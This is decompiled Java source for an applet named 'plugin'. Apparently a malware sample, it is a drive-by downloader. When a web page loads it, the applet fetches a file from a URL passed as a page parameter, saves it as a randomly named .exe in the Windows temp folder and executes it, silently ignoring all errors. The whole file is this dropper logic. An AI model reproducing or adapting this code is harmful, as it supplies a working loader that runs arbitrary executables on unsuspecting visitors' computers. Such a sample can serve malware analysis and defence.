import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.util.Random;
import java.math.BigInteger;
import java.security.SecureRandom;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class plugin extends Applet
{
    private SecureRandom random;
    
    public plugin() {
        this.random = new SecureRandom();
    }
    
    public String nextSessionId() {
        return new BigInteger(130, this.random).toString(32);
    }
    
    @Override
    public void init() {
        try {
            final String string = System.getenv("temp") + "\\" + this.nextSessionId() + ".exe";
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(this.getParameter("MyParam")).openStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(string), 1024);
            final byte[] array = new byte[1024];
            while (bufferedInputStream.read(array, 0, 1024) >= 0) {
                bufferedOutputStream.write(array);
            }
            bufferedOutputStream.close();
            bufferedInputStream.close();
            Runtime.getRuntime().exec(string);
        }
        catch (Exception ex) {}
    }
}
